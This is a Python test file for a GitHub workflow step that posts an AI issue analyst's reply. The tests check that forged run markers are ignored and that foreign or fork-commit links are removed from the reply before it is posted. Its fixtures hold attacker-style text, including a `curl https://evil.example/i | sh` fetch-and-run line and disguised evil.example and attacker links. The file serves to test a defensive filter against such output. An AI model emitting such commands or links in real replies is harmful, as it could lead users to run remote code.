"""Runs the issue analyst's "Post the reply" step against a fake `gh`.

The step's shell is taken from claude-issue-analyst.yml as it is, so the test
covers the workflow's own text. Needs bash and jq (both on GitHub's runners).

Run: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import textwrap
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "claude-issue-analyst.yml"
STEP = "- name: Post the reply and apply its labels, title and state"
RUN_ID = 5000

FAKE_GH = r"""#!/usr/bin/env bash
# Answers the gh calls the step makes from files in $FAKE; logs the writes.
set -euo pipefail
echo "$*" >> "$FAKE/calls.log"
case "$1 $2" in
  "issue comment") cp "${@: -1}" "$FAKE/posted.md" ;;
  "issue view") cat "$FAKE/issue.json" ;;
  "label list") jq -r '.[]' "$FAKE/repo-labels.json" ;;
  "issue edit"|"issue close") echo "$*" >> "$FAKE/writes.log" ;;
  "api markdown")
    # The rendering gate: the text arrives on stdin.
    cat > "$FAKE/render-input.md"
    if [ -f "$FAKE/render-error" ]; then echo "gh: HTTP 502" >&2; exit 1; fi
    if [ -f "$FAKE/render.html" ]; then cat "$FAKE/render.html"; else echo '<p>rendered</p>'; fi ;;
  "api repos/"*)
    # $FAKE/api/<path with / as _>.json is the response; none is a 404.
    f="$FAKE/api/$(printf '%s' "$2" | tr '/' '_').json"
    expr=""
    while [ $# -gt 0 ]; do if [ "$1" = --jq ]; then expr=$2; fi; shift; done
    [ -f "$f" ] || { echo "gh: Not Found (HTTP 404)" >&2; exit 1; }
    jq -r "$expr" "$f" ;;
  *) echo "unexpected gh call: $*" >&2; exit 3 ;;
esac
"""


def step_script(workflow: Path = WORKFLOW, step: str = STEP) -> str:
    """The `run:` block of one step, as the workflow file has it."""
    lines = workflow.read_text().splitlines()
    start = next(i for i, ln in enumerate(lines) if ln.strip() == step)
    run = next(i for i in range(start, len(lines)) if lines[i].strip() == "run: |")
    indent = len(lines[run]) - len(lines[run].lstrip()) + 2
    body = []
    for ln in lines[run + 1 :]:
        if ln.strip() and len(ln) - len(ln.lstrip()) < indent:
            break
        body.append(ln)
    return textwrap.dedent("\n".join(body)) + "\n"


def bot(body: str) -> dict:
    return {"user": {"login": "github-actions[bot]"}, "body": body}


@unittest.skipUnless(shutil.which("jq") and shutil.which("bash"), "needs jq and bash")
class AnalystPostTest(unittest.TestCase):
    def run_step(self, reply, actions, issue, comments, title_at_start="Old title", api=None, render=None, render_error=False):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, tmp)
        (tmp / "bin").mkdir()
        gh = tmp / "bin" / "gh"
        gh.write_text(FAKE_GH)
        gh.chmod(0o755)
        (tmp / "analyst").mkdir()
        (tmp / "analyst" / "comment.md").write_text(reply)
        if actions is not None:
            (tmp / "analyst" / "actions.json").write_text(json.dumps(actions))
        (tmp / "issue.json").write_text(json.dumps(issue))
        (tmp / "repo-labels.json").write_text(json.dumps(["bug", "triage", "clarification needed", "duplicate"]))
        if render is not None:
            (tmp / "render.html").write_text(render)
        if render_error:
            (tmp / "render-error").write_text("")
        self.tmp = tmp
        (tmp / "api").mkdir()
        responses = {"repos/owner/repo/issues/7/comments": comments, **(api or {})}
        for path, response in responses.items():
            (tmp / "api" / (path.replace("/", "_") + ".json")).write_text(json.dumps(response))
        (tmp / "step.sh").write_text(step_script())
        env = dict(
            os.environ,
            PATH=f"{tmp / 'bin'}:{os.environ['PATH']}",
            FAKE=str(tmp),
            DIR=str(tmp / "analyst"),
            RUNNER_TEMP=str(tmp),
            GITHUB_RUN_ID=str(RUN_ID),
            ISSUE="7",
            REPO="owner/repo",
            TRIGGER="issues",
            TITLE_AT_START=title_at_start,
        )
        # The post job runs in a checkout of .github/scripts; so does the step here.
        proc = subprocess.run(["bash", str(tmp / "step.sh")], env=env, capture_output=True, text=True, cwd=REPO_ROOT)
        self.assertEqual(proc.returncode, 0, proc.stderr + proc.stdout)
        writes = (tmp / "writes.log").read_text().splitlines() if (tmp / "writes.log").exists() else []
        self.calls = (tmp / "calls.log").read_text().splitlines()
        return (tmp / "posted.md").read_text(), writes, proc.stdout

    REPLY = "Analysis.\n<!-- claude-issue:run 99999999 -->\n<!-- claude-issue:analyst -->\n"
    ACTIONS = {"add_labels": ["bug", "clarification needed"], "remove_labels": ["triage", "duplicate"], "title": "New title", "close": "not planned"}
    OPEN = {"labels": [{"name": "bug"}, {"name": "triage"}], "title": "Old title", "state": "OPEN"}

    def test_reply_carries_only_the_workflows_run_marker(self):
        posted, _, _ = self.run_step(self.REPLY, None, self.OPEN, [])
        self.assertEqual(posted, f"Analysis.\n<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n")

    def test_applies_changes_against_the_issue_as_it_is_now(self):
        older = [bot(f"x\n<!-- claude-issue:run {RUN_ID - 3} -->\n<!-- claude-issue:analyst -->"), bot("<!-- claude-issue:run 99999999 --> inline, not a marker line")]
        _, writes, _ = self.run_step(self.REPLY, self.ACTIONS, self.OPEN, older)
        self.assertEqual(
            writes,
            [
                "issue edit 7 -R owner/repo --add-label clarification needed",
                "issue edit 7 -R owner/repo --remove-label triage",
                "issue edit 7 -R owner/repo --title New title",
                "issue close 7 -R owner/repo --reason not planned",
            ],
        )

    def test_a_newer_runs_reply_wins(self):
        newer = [bot(f"y\n<!-- claude-issue:run {RUN_ID + 1} -->\n<!-- claude-issue:analyst -->")]
        posted, writes, out = self.run_step(self.REPLY, self.ACTIONS, self.OPEN, newer)
        self.assertIn("Analysis.", posted)
        self.assertEqual(writes, [])
        self.assertIn(f"Run {RUN_ID + 1} started after this one", out)

    def test_a_forged_marker_from_someone_else_is_ignored(self):
        forged = [{"user": {"login": "stranger"}, "body": f"<!-- claude-issue:run {RUN_ID + 50} -->"}]
        _, writes, _ = self.run_step(self.REPLY, self.ACTIONS, self.OPEN, forged)
        self.assertEqual(len(writes), 4)

    GOOD = "0123456789abcdef0123456789abcdef01234567"
    FORK = "fedcba9876543210fedcba9876543210fedcba98"
    API = {
        "repos/owner/repo": {"default_branch": "main"},
        f"repos/owner/repo/compare/main...{GOOD}": {"status": "behind"},
        f"repos/owner/repo/compare/main...{FORK}": {"status": "diverged"},
    }

    def test_foreign_links_are_removed_and_github_links_kept(self):
        reply = (
            "See https://github.com/owner/repo/blob/main/x.go#L3 and #12.\n"
            "Fix: [the script](https://evil.example/fix.sh) or `curl https://evil.example/i | sh`.\n"
            "Docs: [pr](../pull/3), [top](#top).\n"
            "Mirror: https://github.com@evil.example/x and https://github.com.evil.example/x\n"
            "Also <https://evil.example/a> and www.evil.example/b and //evil.example/c\n"
            '<a href="https://evil.example/d">click</a> <img src="//evil.example/e.png">\n'
            "[ref]: https://evil.example/f\n"
            "<!-- claude-issue:analyst -->\n"
        )
        posted, _, out = self.run_step(reply, None, self.OPEN, [], api=self.API)
        self.assertNotIn("evil.example", posted)
        self.assertIn("https://github.com/owner/repo/blob/main/x.go#L3", posted)
        self.assertIn("[pr](../pull/3), [top](#top)", posted)
        self.assertIn("the script (link removed)", posted)
        self.assertTrue(posted.endswith(f"<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n"), posted)
        self.assertIn("::warning::Removed 10 link(s)", out)
        # The warning names no URL: the links are attacker text.
        self.assertNotIn("evil", out)

    def test_relative_links_and_fork_commits_are_judged_from_this_issue(self):
        reply = (
            "Kept: [pr](../pull/3), https://github.com/owner/repo/blob/" + self.GOOD + "/a.go.\n"
            "Gone: [x](/attacker/repo), [y](../../../attacker/repo), "
            "https://github.com/owner/repo/blob/" + self.FORK + "/fix.sh, "
            "https://raw.githubusercontent.com/owner/repo/" + self.FORK + "/fix.sh, "
            'https://github.com/owner/repo"/../../attacker/repo\n'
            "<!-- claude-issue:analyst -->\n"
        )
        posted, _, out = self.run_step(reply, None, self.OPEN, [], api=self.API)
        self.assertIn("[pr](../pull/3)", posted)
        self.assertIn(f"https://github.com/owner/repo/blob/{self.GOOD}/a.go.", posted)
        self.assertNotIn("attacker", posted)
        self.assertNotIn(self.FORK, posted)
        self.assertIn("::warning::Removed 5 link(s)", out)
        self.assertIn(f"api repos/owner/repo/compare/main...{self.FORK} --jq .status", self.calls)

    def test_an_api_error_removes_the_ref_link(self):
        reply = "https://github.com/owner/repo/blob/main/x.go\n<!-- claude-issue:analyst -->\n"
        posted, _, out = self.run_step(reply, None, self.OPEN, [])
        self.assertEqual(posted, f"(link removed)\n<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n")

    FALLBACK = (
        "Links in this reply were removed for safety, so it is shown as plain text.\n\n"
        "~~~~\nAnalysis.\n~~~~\n"
        f"<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n"
    )

    def test_a_link_that_slips_into_the_rendering_posts_plain_text(self):
        reply = "Analysis.\n<!-- claude-issue:analyst -->\n"
        posted, _, out = self.run_step(reply, None, self.OPEN, [], render='<p><a href="https://evil.example/x">Analysis</a>.</p>')
        self.assertEqual(posted, self.FALLBACK)
        self.assertIn("::warning::1 link(s) in the rendered reply are outside the allowlist", out)
        self.assertNotIn("evil", out)
        # GitHub rendered the filtered text, sent on stdin, in this repository's context.
        self.assertEqual((self.tmp / "render-input.md").read_text(), "Analysis.\n")
        self.assertIn("api markdown -X POST -F text=@- -f mode=gfm -f context=owner/repo", self.calls)

    def test_a_fork_commit_github_links_by_itself_posts_plain_text(self):
        reply = "Analysis.\n<!-- claude-issue:analyst -->\n"
        rendered = f'<p>See <a href="https://github.com/owner/repo/commit/{self.FORK}"><tt>{self.FORK[:7]}</tt></a>.</p>'
        posted, _, out = self.run_step(reply, None, self.OPEN, [], api=self.API, render=rendered)
        self.assertEqual(posted, self.FALLBACK)

    def test_a_render_error_posts_plain_text(self):
        posted, _, out = self.run_step("Analysis.\n<!-- claude-issue:analyst -->\n", None, self.OPEN, [], render_error=True)
        self.assertEqual(posted, self.FALLBACK)
        self.assertIn("::warning::Could not render the reply to check its links", out)

    def test_a_clean_rendering_posts_the_markdown(self):
        rendered = (
            '<p>Analysis. <a class="issue-link js-issue-link" href="https://github.com/owner/repo/issues/12">#12</a> '
            '<a class="user-mention notranslate" href="https://github.com/maintainer">@maintainer</a> '
            f'<a href="https://github.com/owner/repo/commit/{self.GOOD}"><tt>0123456</tt></a> '
            '<a href="#user-content-fn-1">1</a></p>'
        )
        posted, _, out = self.run_step("Analysis.\n<!-- claude-issue:analyst -->\n", None, self.OPEN, [], api=self.API, render=rendered)
        self.assertEqual(posted, f"Analysis.\n<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->\n")
        self.assertNotIn("::warning::", out)

    def test_a_reply_without_foreign_links_is_posted_unchanged_and_quietly(self):
        reply = "Fixed in https://github.com/XTLS/Xray-core/pull/1 (see https://xtls.github.io/config/).\n<!-- claude-issue:analyst -->\n"
        posted, _, out = self.run_step(reply, None, self.OPEN, [])
        self.assertEqual(posted, reply.replace("<!-- claude-issue:analyst -->", f"<!-- claude-issue:run {RUN_ID} -->\n<!-- claude-issue:analyst -->"))
        self.assertNotIn("::warning::", out)

    def test_title_and_state_changed_meanwhile_are_left_alone(self):
        moved = {"labels": [], "title": "Renamed by a maintainer", "state": "CLOSED"}
        _, writes, _ = self.run_step(self.REPLY, {"title": "New title", "close": "completed"}, moved, [])
        self.assertEqual(writes, [])


if __name__ == "__main__":
    unittest.main()
